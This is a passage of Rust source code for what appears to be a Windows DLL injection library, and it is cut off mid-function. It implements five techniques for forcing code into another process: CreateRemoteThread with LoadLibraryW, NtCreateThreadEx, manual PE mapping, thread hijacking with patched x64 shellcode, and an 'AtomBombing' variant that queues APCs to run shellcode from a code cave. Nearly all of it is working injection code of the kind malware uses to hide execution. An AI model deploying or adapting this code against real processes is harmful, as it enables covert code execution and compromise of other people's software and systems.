use std::io;
use std::mem::{self};
use std::path::Path;
use std::ptr::null_mut;
use std::slice;
use crate::injector_core::winapi::c_void;

use super::utils::*;
use super::winapi::*;
use super::process::*;
use super::inject_helper::*;
use super::winapi::ATOM;

const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_REL_BASED_ABSOLUTE: u16 = 0;
const IMAGE_REL_BASED_HIGHLOW: u16 = 3;
const IMAGE_REL_BASED_DIR64: u16 = 10;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;

#[repr(C)]
struct ImageBaseRelocation {
    virtual_address: u32,
    size_of_block: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InjectionMethod {
    LoadLibrary,
    NtCreateThreadEx,
    ManualMap,
    ThreadHijack,
    AtomBombing,
    // Reflective,
    // QueueUserAPC,
}

pub trait Injector {
    fn inject_with_method(&self, dll_path: &str, method: InjectionMethod) -> Result<(), io::Error>;
    fn eject(&self, dll_path: &str) -> Result<(), io::Error>;
}

impl Injector for Process {

    fn inject_with_method(&self, dll_path: &str, method: InjectionMethod) -> Result<(), io::Error> {
        match method {
            InjectionMethod::LoadLibrary => self.inject_via_loadlibrary(dll_path),
            InjectionMethod::NtCreateThreadEx => self.inject_via_ntcreate(dll_path),
            InjectionMethod::ManualMap => self.inject_via_manualmap(dll_path),
            InjectionMethod::ThreadHijack => self.inject_via_thread_hijack(dll_path),
            InjectionMethod::AtomBombing => self.inject_via_atombombing(dll_path),
        }
    }

    fn eject(&self, dll_path: &str) -> Result<(), io::Error> {
        let fullpath = Path::new(dll_path).canonicalize()?;
        let fullpath_str = fullpath.to_string_lossy().to_lowercase();

        let process_id: DWORD = unsafe { GetProcessId(self.handle) };
        let snapshot_handle = unsafe {
            CreateToolhelp32Snapshot(
                TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
                process_id,
            )
        };

        if snapshot_handle == INVALID_HANDLE_VALUE {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to create module snapshot"));
        }

        let mut module_entry: MODULEENTRY32W = unsafe { mem::zeroed() };
        module_entry.dwSize = mem::size_of::<MODULEENTRY32W>() as u32;

        let mut target_module: Option<*mut std::ffi::c_void> = None;
        let mut found = false;
        if unsafe { Module32FirstW(snapshot_handle, &mut module_entry) } != FALSE {
            loop {
                let module_path = wide_str_to_string(&module_entry.szExePath);
                if module_path.to_lowercase() == fullpath_str {
                    target_module = Some(module_entry.hModule as *mut _);
                    found = true;
                    break;
                }
                if unsafe { Module32NextW(snapshot_handle, &mut module_entry) } == FALSE {
                    break;
                }
            }
        }

        unsafe { CloseHandle(snapshot_handle) };

        if !found {
            return Err(io::Error::new(io::ErrorKind::Other, "Module not found in remote process"));
        }

        let free_library_addr = unsafe {
            GetProcAddress(
                GetModuleHandleA(b"kernel32.dll\0".as_ptr() as _),
                b"FreeLibrary\0".as_ptr() as _,
            )
        };
        if free_library_addr.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "Could not get FreeLibrary address"));
        }

        let thread_handle = unsafe {
            CreateRemoteThread(
                self.handle,
                null_mut(),
                0,
                Some(mem::transmute(free_library_addr)),
                target_module.unwrap() as LPVOID,
                0,
                null_mut(),
            )
        };

        if thread_handle.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, format!("CreateRemoteThread failed with error code: {}", unsafe { GetLastError() })));
        }

        let wait_result = unsafe { WaitForSingleObject(thread_handle, 5000) };
        if wait_result == WAIT_FAILED {
            eprintln!("Warning: WaitForSingleObject failed for the remote thread.");
        }

        unsafe { CloseHandle(thread_handle) };

        Ok(())
    }
}

impl Process {
    fn inject_via_loadlibrary(&self, dll: &str) -> Result<(), io::Error> {
        let fullpath = Path::new(dll).canonicalize()?;
        let dll = fullpath.to_str().unwrap();
        let path_wstr = to_wide_string(dll);
        let path_len = path_wstr.len() * 2;

        let r_path_addr = unsafe {
            VirtualAllocEx(
                self.handle,
                null_mut(),
                path_len,
                MEM_RESERVE | MEM_COMMIT,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if r_path_addr.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "VirtualAllocEx failed"));
        }

        let wpm_ok = unsafe {
            WriteProcessMemory(
                self.handle,
                r_path_addr,
                path_wstr.as_ptr() as _,
                path_len,
                null_mut(),
            )
        };
        if wpm_ok == FALSE {
            return Err(io::Error::new(io::ErrorKind::Other, "WriteProcessMemory failed"));
        }

        let loadlib_w_addr = unsafe {
            GetProcAddress(
                GetModuleHandleA("kernel32.dll\0".as_ptr() as _),
                "LoadLibraryW\0".as_ptr() as _,
            )
        };
        if loadlib_w_addr.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "Could not get LoadLibraryW address"));
        }

        let thread_handle = unsafe {
            CreateRemoteThread(
                self.handle,
                null_mut(),
                0,
                Some(mem::transmute(loadlib_w_addr)),
                r_path_addr,
                0,
                null_mut(),
            )
        };
        if thread_handle.is_null() {
            return Err(get_last_error());
        }

        let wait_code = unsafe { WaitForSingleObject(thread_handle, 5000) };
        if wait_code == WAIT_FAILED {
            // not fatal, but suspicious
        }

        unsafe {
            CloseHandle(thread_handle);
            VirtualFreeEx(self.handle, r_path_addr, 0, MEM_RELEASE);
        }

        Ok(())
    }

    fn inject_via_ntcreate(&self, dll_path: &str) -> Result<(), io::Error> {
        let process_handle = self.handle;

        let load_library_w = unsafe {
            GetProcAddress(
                GetModuleHandleA(b"kernel32.dll\0".as_ptr() as _),
                b"LoadLibraryW\0".as_ptr() as _,
            )
        };
        if load_library_w.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "Could not get LoadLibraryW address"));
        }

        let ntdll_module = unsafe { GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _) };
        if ntdll_module.is_null() {
            // handle error
        }

        let nt_create_thread_ex_addr = unsafe {
            GetProcAddress(ntdll_module, b"NtCreateThreadEx\0".as_ptr() as _)
        };
        if nt_create_thread_ex_addr.is_null() {
            // handle error
        }

        let filepath = Path::new(dll_path).canonicalize()?;
        let wide_path = to_wide_string(filepath.to_str().unwrap());
        let path_len_in_bytes = wide_path.len() * 2;

        let remote_mem = unsafe {
            VirtualAllocEx(
                process_handle,
                std::ptr::null_mut(),
                path_len_in_bytes,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if remote_mem.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "VirtualAllocEx failed"));
        }

        let wpm_ok = unsafe {
            WriteProcessMemory(
                process_handle,
                remote_mem,
                wide_path.as_ptr() as _,
                path_len_in_bytes,
                std::ptr::null_mut(),
            )
        };
        if wpm_ok == FALSE {
            unsafe { VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE) };
            return Err(io::Error::new(io::ErrorKind::Other, "WriteProcessMemory failed"));
        }

        let ntdll = unsafe { GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _) };
        if ntdll.is_null() {
            unsafe {
                VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            }
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to get ntdll module handle"));
        }

        let nt_create_thread_ex_addr = unsafe {
            GetProcAddress(ntdll, b"NtCreateThreadEx\0".as_ptr() as _)
        };
        if nt_create_thread_ex_addr.is_null() {
            unsafe {
                VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            }
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to get NtCreateThreadEx address"));
        }

        let nt_create_thread_ex_fn: NtCreateThreadEx = unsafe {
            std::mem::transmute(nt_create_thread_ex_addr)
        };

        let mut thread_handle: HANDLE = std::ptr::null_mut();
        let status = unsafe {
            nt_create_thread_ex_fn(
                &mut thread_handle,
                0x1FFFFF,           // THREAD_ALL_ACCESS
                null_mut(),         // OBJECT_ATTRIBUTES
                process_handle,
                load_library_w as PVOID,
                remote_mem as PVOID,
                0,                  // CreateFlags (0 for immediate execution)
                0,                  // ZeroBits
                0,                  // StackSize (default)
                0,                  // MaximumStackSize
                null_mut(),         // AttributeList
            )
        };

        if status != 0 {
            unsafe {
                VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            }
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("NtCreateThreadEx failed, NTSTATUS={:#x}", status),
            ));
        }

        unsafe {
            WaitForSingleObject(thread_handle, 1000);
            CloseHandle(thread_handle);
            VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
        }

        Ok(())
    }

    fn inject_via_manualmap(&self, dll_path: &str) -> Result<(), io::Error> {
        let file_data = std::fs::read(dll_path)?;

        let dos_header = unsafe {
            if mem::size_of::<DosHeader>() > file_data.len() {
                return Err(io::Error::new(io::ErrorKind::Other, "File too small for DOS header"));
            }
            &*(file_data.as_ptr() as *const DosHeader)
        };
        if dos_header.e_magic != 0x5A4D {
            return Err(io::Error::new(io::ErrorKind::Other, "Invalid DOS header"));
        }

        let nt_headers_offset = dos_header.e_lfanew as usize;
        let nt_headers = unsafe {
            if nt_headers_offset + mem::size_of::<NtHeaders64>() > file_data.len() {
                return Err(io::Error::new(io::ErrorKind::Other, "File too small for NT headers"));
            }
            &*(file_data.as_ptr().add(nt_headers_offset) as *const NtHeaders64)
        };
        if nt_headers.signature != 0x4550 {
            return Err(io::Error::new(io::ErrorKind::Other, "Invalid PE header"));
        }

        let is_pe32_plus = nt_headers.optional_header.magic == 0x20B;
        let is_pe32 = nt_headers.optional_header.magic == 0x10B;

        if !is_pe32_plus && !is_pe32 {
            return Err(io::Error::new(io::ErrorKind::Other, "Invalid PE format"));
        }

        let section_count = nt_headers.file_header.number_of_sections as usize;
        let section_headers_offset = nt_headers_offset + mem::size_of::<NtHeaders64>();
        let total_section_headers_size = section_count * mem::size_of::<ImageSectionHeader>();

        if section_headers_offset + total_section_headers_size > file_data.len() {
            return Err(io::Error::new(io::ErrorKind::Other, "File too small for section headers"));
        }

        let section_headers = unsafe {
            slice::from_raw_parts(
                file_data.as_ptr().add(section_headers_offset) as *const ImageSectionHeader,
                section_count,
            )
        };

        let image_size = nt_headers.optional_header.size_of_image as usize;
        let base_address = unsafe {
            VirtualAllocEx(
                self.handle,
                null_mut(),
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if base_address.is_null() {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("VirtualAllocEx failed: {}", unsafe { GetLastError() })
            ));
        }

        let headers_size = nt_headers.optional_header.size_of_headers as usize;
        let write_result = unsafe {
            WriteProcessMemory(
                self.handle,
                base_address,
                file_data.as_ptr() as *const c_void,
                headers_size,
                null_mut(),
            )
        };
        if write_result == FALSE {
            unsafe { VirtualFreeEx(self.handle, base_address, 0, MEM_RELEASE) };
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("WriteProcessMemory (headers) failed: {}", unsafe { GetLastError() })
            ));
        }

        for section in section_headers {
            if section.size_of_raw_data == 0 || section.pointer_to_raw_data == 0 {
                continue;
            }

            let section_start = section.pointer_to_raw_data as usize;
            let section_end = section_start + section.size_of_raw_data as usize;

            if section_start >= file_data.len() {
                continue;
            }

            let copy_size = if section_end > file_data.len() {
                file_data.len() - section_start
            } else {
                section.size_of_raw_data as usize
            };

            if copy_size == 0 {
                continue;
            }

            let section_data = &file_data[section_start..section_start + copy_size];
            let dest_addr = unsafe { base_address.add(section.virtual_address as usize) };

            let write_result = unsafe {
                WriteProcessMemory(
                    self.handle,
                    dest_addr,
                    section_data.as_ptr() as *const c_void,
                    copy_size,
                    null_mut(),
                )
            };
            if write_result == FALSE {
                eprintln!("Warning: Failed to write section at RVA {:#x}", section.virtual_address);
            }
        }

        if base_address as usize != nt_headers.optional_header.image_base as usize {
            if let Err(e) = self.perform_relocations(&file_data, base_address, nt_headers) {
                eprintln!("Warning: Relocation failed: {}", e);
            }
        }

        let entry_rva = nt_headers.optional_header.address_of_entry_point;
        if entry_rva != 0 {
            let entry_point = unsafe { base_address.add(entry_rva as usize) };

            let thread_handle = unsafe {
                CreateRemoteThread(
                    self.handle,
                    null_mut(),
                    0,
                    Some(mem::transmute(entry_point)),
                    base_address as LPVOID,
                    0,
                    null_mut(),
                )
            };

            if thread_handle.is_null() {
                unsafe { VirtualFreeEx(self.handle, base_address, 0, MEM_RELEASE) };
                return Err(io::Error::new(
                    io::ErrorKind::Other,
                    format!("CreateRemoteThread failed: {}", unsafe { GetLastError() })
                ));
            }

            unsafe {
                WaitForSingleObject(thread_handle, 5000);
                CloseHandle(thread_handle);
            }
        }

        println!("Manual map injection completed successfully");
        Ok(())
    }

    fn perform_relocations(&self, file_data: &[u8], new_base: LPVOID, nt_headers: &NtHeaders64) -> Result<(), io::Error> {
        let delta = (new_base as u64).wrapping_sub(nt_headers.optional_header.image_base);
        if delta == 0 {
            return Ok(());
        }

        let reloc_dir = nt_headers.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
            return Ok(());
        }

        let reloc_offset = self.rva_to_offset(nt_headers, reloc_dir.virtual_address)
            .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Invalid relocation table RVA"))?;

        if reloc_offset + reloc_dir.size as usize > file_data.len() {
            return Err(io::Error::new(io::ErrorKind::Other, "Relocation table exceeds file bounds"));
        }

        let reloc_data = &file_data[reloc_offset..reloc_offset + reloc_dir.size as usize];
        let mut current_offset = 0;

        while current_offset + mem::size_of::<ImageBaseRelocation>() <= reloc_data.len() {
            let block = unsafe {
                &*(reloc_data.as_ptr().add(current_offset) as *const ImageBaseRelocation)
            };

            current_offset += mem::size_of::<ImageBaseRelocation>();
            let block_end = current_offset + block.size_of_block as usize - mem::size_of::<ImageBaseRelocation>();

            if block_end > reloc_data.len() {
                return Err(io::Error::new(io::ErrorKind::Other, "Invalid relocation block size"));
            }

            let page_base = unsafe { new_base.add(block.virtual_address as usize) };

            let entry_count = (block.size_of_block as usize - mem::size_of::<ImageBaseRelocation>()) / 2;
            for _ in 0..entry_count {
                if current_offset + 2 > reloc_data.len() {
                    break;
                }

                let entry_data = unsafe {
                    *reloc_data.as_ptr().add(current_offset).cast::<u16>()
                };
                current_offset += 2;

                if entry_data == 0 {
                    continue;
                }

                let reloc_type = entry_data >> 12;
                let offset = entry_data & 0xFFF;

                match reloc_type {
                    IMAGE_REL_BASED_HIGHLOW | IMAGE_REL_BASED_DIR64 => {
                        let reloc_addr = unsafe { page_base.add(offset as usize) };
                        self.apply_relocation(reloc_addr, delta, reloc_type)?;
                    }
                    IMAGE_REL_BASED_ABSOLUTE => {}
                    _ => {
                        eprintln!("Warning: Unsupported relocation type: {}", reloc_type);
                    }
                }
            }
        }

        Ok(())
    }

    pub fn inject_via_thread_hijack(&self, dll_path: &str) -> Result<(), io::Error> {
        if let Err(e) = enable_debug_privilege() {
            eprintln!("Warning: Could not enable debug privilege: {}", e);
        }

        let full_path = std::fs::canonicalize(dll_path)?;
        let wide_path: Vec<u16> = full_path
            .to_str()
            .unwrap()
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let path_len_bytes = wide_path.len() * 2;

        let thread_id = self.find_suitable_thread()?;

        let h_thread = unsafe {
            OpenThread(
                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                FALSE,
                thread_id,
            )
        };
        if h_thread.is_null() {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("OpenThread failed: {}", unsafe { GetLastError() }),
            ));
        }

        let suspend_count = unsafe { SuspendThread(h_thread) };
        if suspend_count == u32::MAX {
            unsafe { CloseHandle(h_thread) };
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to suspend thread"));
        }

        let mut ctx: CONTEXT = unsafe { mem::zeroed() };
        ctx.ContextFlags = CONTEXT_FULL;
        if unsafe { GetThreadContext(h_thread, &mut ctx) } == FALSE {
            self.cleanup_thread_hijack(h_thread, suspend_count);
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("GetThreadContext failed: {}", unsafe { GetLastError() })
            ));
        }

        let remote_mem = unsafe {
            VirtualAllocEx(
                self.handle,
                null_mut(),
                path_len_bytes,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if remote_mem.is_null() {
            self.cleanup_thread_hijack(h_thread, suspend_count);
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("VirtualAllocEx failed: {}", unsafe { GetLastError() })
            ));
        }

        let wpm_ok = unsafe {
            WriteProcessMemory(
                self.handle,
                remote_mem,
                wide_path.as_ptr() as *const c_void,
                path_len_bytes,
                null_mut(),
            )
        };
        if wpm_ok == FALSE {
            unsafe { VirtualFreeEx(self.handle, remote_mem, 0, MEM_RELEASE) };
            self.cleanup_thread_hijack(h_thread, suspend_count);
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("WriteProcessMemory failed: {}", unsafe { GetLastError() })
            ));
        }

        let loadlib_addr = unsafe {
            GetProcAddress(
                GetModuleHandleA(b"kernel32.dll\0".as_ptr() as _),
                b"LoadLibraryW\0".as_ptr() as _,
            )
        };
        if loadlib_addr.is_null() {
            unsafe { VirtualFreeEx(self.handle, remote_mem, 0, MEM_RELEASE) };
            self.cleanup_thread_hijack(h_thread, suspend_count);
            return Err(io::Error::new(io::ErrorKind::Other, "LoadLibraryW not found"));
        }

        let shellcode = self.create_hijack_shellcode(loadlib_addr as PVOID, remote_mem, ctx.Rip)?;

        ctx.Rip = shellcode as u64;

        if unsafe { SetThreadContext(h_thread, &ctx) } == FALSE {
            unsafe { VirtualFreeEx(self.handle, remote_mem, 0, MEM_RELEASE) };
            self.cleanup_thread_hijack(h_thread, suspend_count);
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("SetThreadContext failed: {}", unsafe { GetLastError() })
            ));
        }

        if unsafe { ResumeThread(h_thread) } == u32::MAX {
            unsafe { VirtualFreeEx(self.handle, remote_mem, 0, MEM_RELEASE) };
            unsafe { CloseHandle(h_thread) };
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to resume thread"));
        }

        std::thread::sleep(std::time::Duration::from_millis(1000));
        unsafe { CloseHandle(h_thread) };

        println!("Thread hijack injection completed");
        Ok(())
    }

    fn find_suitable_thread(&self) -> Result<u32, io::Error> {
        let snapshot = unsafe {
            CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
        };

        if snapshot == INVALID_HANDLE_VALUE {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to create thread snapshot"));
        }

        let mut thread_entry: THREADENTRY32 = unsafe { mem::zeroed() };
        thread_entry.dwSize = mem::size_of::<THREADENTRY32>() as u32;

        let mut candidate_threads = Vec::new();

        if unsafe { Thread32First(snapshot, &mut thread_entry) } != FALSE {
            loop {
                if thread_entry.th32OwnerProcessID == self.pid {
                    // try to open thread with required permissions to verify access
                    let test_handle = unsafe {
                        OpenThread(
                            0x1FFFFF, // THREAD_ALL_ACCESS
                            FALSE,
                            thread_entry.th32ThreadID,
                        )
                    };
                    if !test_handle.is_null() {
                        unsafe { CloseHandle(test_handle) };
                        candidate_threads.push(thread_entry.th32ThreadID);
                    }
                }
                if unsafe { Thread32Next(snapshot, &mut thread_entry) } == FALSE {
                    break;
                }
            }
        }

        unsafe { CloseHandle(snapshot) };

        candidate_threads.first().copied()
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "No suitable thread found"))
    }

    fn create_hijack_shellcode(
        &self,
        loadlib_addr: PVOID,
        dll_path: LPVOID,
        original_rip: u64
    ) -> Result<LPVOID, io::Error> {
        #[cfg(target_arch = "x86_64")]
        let shellcode_template: &[u8] = &[
            0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 40 (shadow space)
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, dll_path (placeholder)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, loadlib_addr (placeholder)
            0xFF, 0xD0,                                                 // call rax
            0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 40
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, original_rip (placeholder)
            0xFF, 0xE0,                                                 // jmp rax
        ];

        let mut shellcode = shellcode_template.to_vec();

        // Patch in the actual addresses
        let dll_path_bytes = (dll_path as u64).to_le_bytes();
        shellcode[6..14].copy_from_slice(&dll_path_bytes);

        let loadlib_bytes = (loadlib_addr as u64).to_le_bytes();
        shellcode[16..24].copy_from_slice(&loadlib_bytes);

        let original_rip_bytes = original_rip.to_le_bytes();
        shellcode[32..40].copy_from_slice(&original_rip_bytes);

        // Allocate and write the shellcode
        let shellcode_mem = unsafe {
            VirtualAllocEx(
                self.handle,
                null_mut(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };

        if shellcode_mem.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to allocate shellcode memory"));
        }

        let write_result = unsafe {
            WriteProcessMemory(
                self.handle,
                shellcode_mem,
                shellcode.as_ptr() as *const c_void,
                shellcode.len(),
                null_mut(),
            )
        };

        if write_result == FALSE {
            unsafe { VirtualFreeEx(self.handle, shellcode_mem, 0, MEM_RELEASE) };
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to write shellcode"));
        }

        Ok(shellcode_mem)
    }

    fn cleanup_thread_hijack(&self, h_thread: HANDLE, suspend_count: u32) {
        unsafe {
            for _ in 0..suspend_count {
                ResumeThread(h_thread);
            }
            CloseHandle(h_thread);
        }
    }

    fn inject_via_atombombing(&self, dll_path: &str) -> Result<(), io::Error> {
        if let Err(e) = enable_debug_privilege() {
            eprintln!("Warning: Could not enable debug privilege: {}", e);
        }

        println!("[*] ATOM BOMBING");

        let full_path = std::fs::canonicalize(dll_path)?;
        let mut dll_path_str = full_path.to_str().unwrap().to_string();

        // Remove \\?\ prefix that canonicalize() adds on Windows - LoadLibraryA doesn't support it
        if dll_path_str.starts_with(r"\\?\") {
            dll_path_str = dll_path_str[4..].to_string();
        }

        // Find alertable thread
        println!("[*] Searching for an alertable thread...");
        let alertable_thread = self.find_alertable_thread()?;
        println!("[*] Found alertable thread: {:?}", alertable_thread);

        // Find code cave in target process
        println!("[*] Finding remote code cave...");
        let code_cave = self.get_code_cave_address()?;
        println!("[*] Remote code cave found: 0x{:X}", code_cave as usize);

        // Verify the allocation is valid
        if code_cave.is_null() {
            return Err(io::Error::new(io::ErrorKind::Other, "Code cave allocation returned null"));
        }

        // Check if the address is in valid user-mode range (< 0x00007FFFFFFFFFFF on x64)
        let addr_value = code_cave as usize;
        if addr_value > 0x00007FFFFFFFFFFF {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("Invalid address returned: 0x{:X} (outside user-mode range)", addr_value)
            ));
        }

        // Set up memory layout
        let remote_function_pointers = code_cave;
        let fp_size = mem::size_of::<FunctionPointers>();
        println!("[DEBUG] FunctionPointers size: {}", fp_size);
        println!("[DEBUG] code_cave pointer: {:p}", code_cave);
        println!("[DEBUG] code_cave as usize: 0x{:X}", code_cave as usize);
        let remote_shellcode = unsafe { (code_cave as *mut u8).add(fp_size) as LPVOID };
        println!("[DEBUG] remote_shellcode after add: {:p}", remote_shellcode);

        println!("[*] Memory layout:");
        println!("    Function pointers: 0x{:X} (size: {} bytes)", remote_function_pointers as usize, fp_size);
        println!("    Shellcode:         0x{:X} (should be +{} = 0x{:X})",
                 remote_shellcode as usize,
                 fp_size,
                 (code_cave as usize) + fp_size);

        // Copy function pointers via APC
        println!("[*] Copying LoadLibraryA and GetProcAddress addresses...");
        self.apc_copy_function_pointers(alertable_thread, remote_function_pointers)?;

        // Verify function pointers were written correctly
        let mut fp_verify = FunctionPointers {
            pfn_load_library_a: null_mut(),
            pfn_get_proc_address: null_mut(),
        };
        let mut bytes_read = 0;
        let verify_result = unsafe {
            ReadProcessMemory(
                self.handle,
                remote_function_pointers,
                &mut fp_verify as *mut _ as LPVOID,
                mem::size_of::<FunctionPointers>(),
                &mut bytes_read,
            )
        };
        if verify_result != FALSE && bytes_read == mem::size_of::<FunctionPointers>() {
            println!("[*] Verified LoadLibraryA at: {:p}", fp_verify.pfn_load_library_a);
            println!("[*] Verified GetProcAddress at: {:p}", fp_verify.pfn_get_proc_address);
        } else {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to verify function pointers"));
        }

        // Allocate and write DLL path string (ANSI for LoadLibraryA)
        // First verify the DLL exists locally
        if !std::path::Path::new(&dll_path_str).exists() {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                format!("DLL file not found: {}", dll_path_str)
            ));
        }
        println!("[*] DLL file exists: {}", dll_path_str);

        let dll_path_ansi = dll_path_str.as_str().as_bytes();
        let dll_path_size = dll_path_ansi.len() + 1; // +1 for null terminator
        let remote_dll_path = unsafe { (remote_shellcode as *mut u8).add(1024) as LPVOID }; // After shellcode space

        println!("[*] Writing DLL path to target process...");
        let mut dll_path_with_null = dll_path_ansi.to_vec();
        dll_path_with_null.push(0); // Add null terminator
        self.apc_write_process_memory(alertable_thread, remote_dll_path, &dll_path_with_null)?;

        // Verify DLL path was written correctly
        let mut path_verify = vec![0u8; dll_path_with_null.len()];
        let mut bytes_read = 0;
        let verify_result = unsafe {
            ReadProcessMemory(
                self.handle,
                remote_dll_path,
                path_verify.as_mut_ptr() as LPVOID,
                dll_path_with_null.len(),
                &mut bytes_read,
            )
        };
        if verify_result != FALSE && bytes_read == dll_path_with_null.len() {
            let verified_path = String::from_utf8_lossy(&path_verify[..path_verify.len() - 1]);
            println!("[*] Verified DLL path: {}", verified_path);
            if path_verify != dll_path_with_null {
                return Err(io::Error::new(io::ErrorKind::Other, "DLL path verification mismatch"));
            }
        } else {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to verify DLL path"));
        }

        // Create and copy shellcode
        println!("[*] Creating shellcode...");
        let shellcode = self.create_atombombing_shellcode_with_path(remote_function_pointers, remote_dll_path)?;
        println!("[*] Shellcode size: {} bytes", shellcode.len());
        println!("[*] Shellcode will be written to: 0x{:X}", remote_shellcode as usize);

        println!("[*] Copying shellcode to target process...");
        self.apc_write_process_memory(alertable_thread, remote_shellcode, &shellcode)?;

        // Verify shellcode
        let mut shellcode_verify = vec![0u8; shellcode.len()];
        let mut bytes_read = 0;
        let verify_result = unsafe {
            ReadProcessMemory(
                self.handle,
                remote_shellcode,
                shellcode_verify.as_mut_ptr() as LPVOID,
                shellcode.len(),
                &mut bytes_read,
            )
        };
        if verify_result != FALSE && bytes_read == shellcode.len() {
            println!("[*] Verified shellcode written correctly ({} bytes)", bytes_read);
            if shellcode_verify != shellcode {
                println!("[!] WARNING: Shellcode content mismatch!");
                println!("[!] Expected first 16 bytes: {:02X?}", &shellcode[..16.min(shellcode.len())]);
                println!("[!] Got first 16 bytes:      {:02X?}", &shellcode_verify[..16.min(shellcode_verify.len())]);
                return Err(io::Error::new(io::ErrorKind::Other, "Shellcode verification failed"));
            }
        } else {
            return Err(io::Error::new(io::ErrorKind::Other, format!("Failed to verify shellcode (read {} of {} bytes)", bytes_read, shellcode.len())));
        }

        // Execute shellcode via QueueUserAPC (true AtomBombing technique)
        println!("[*] Executing shellcode via QueueUserAPC...");

        // Queue multiple APCs to increase chance of execution
        for i in 0..5 {
            let result = unsafe {
                QueueUserAPC(
                    Some(mem::transmute(remote_shellcode)),
                    alertable_thread,
                    0, // No parameter needed
                )
            };

            if result == 0 {
                return Err(io::Error::new(
                    io::ErrorKind::Other,
                    format!("QueueUserAPC #{} failed: {}", i, unsafe { GetLastError() })
                ));
            }
        }
        println!("[*] Queued 5 APCs to alertable thread");

        // Give the APC time to execute (APCs only execute when thread enters alertable wait)
        println!("[*] Waiting for APC to execute (this requires the thread to enter alertable wait)...");
        std::thread::sleep(std::time::Duration::from_millis(3000));

        // Check if the process is still alive
        let mut exit_code: DWORD = 0;
        let process_alive = unsafe {
            GetExitCodeProcess(self.handle, &mut exit_code) != 0 && exit_code == 259 // STILL_ACTIVE
        };

        if !process_alive {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("Target process crashed or exited (exit code: {})", exit_code)
            ));
        }

        println!("[*] Process is still alive");

        // Verify the DLL was loaded by checking loaded modules
        println!("[*] Verifying DLL was loaded...");
        let dll_loaded = self.check_if_dll_loaded(&dll_path_str)?;

        if dll_loaded {
            println!("[*] SUCCESS: DLL is loaded in target process!");
        } else {
            println!("[!] WARNING: DLL does not appear to be loaded in target process");
            println!("[!] The process may have crashed or the injection failed");
            return Err(io::Error::new(
                io::ErrorKind::Other,
                "DLL not found in target process after injection"
            ));
        }

        println!("[*] AtomBombing injection completed successfully!");
        Ok(())
    }

    fn check_if_dll_loaded(&self, dll_path: &str) -> Result<bool, io::Error> {
        let snapshot_handle = unsafe {
            CreateToolhelp32Snapshot(
                TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
                self.pid,
            )
        };

        if snapshot_handle == INVALID_HANDLE_VALUE {
            return Err(io::Error::new(io::ErrorKind::Other, "Failed to create module snapshot"));
        }

        let mut module_entry: MODULEENTRY32W = unsafe { mem::zeroed() };
        module_entry.dwSize = mem::size_of::<MODULEENTRY32W>() as u32;

        let dll_name = Path::new(dll_path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_lowercase();

        let mut found = false;
        if unsafe { Module32FirstW(snapshot_handle, &mut module_entry) } != FALSE {
            loop {
                let module_path = wide_str_to_string(&module_entry.szExePath);
                let module_name = Path::new(&module_path)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("")
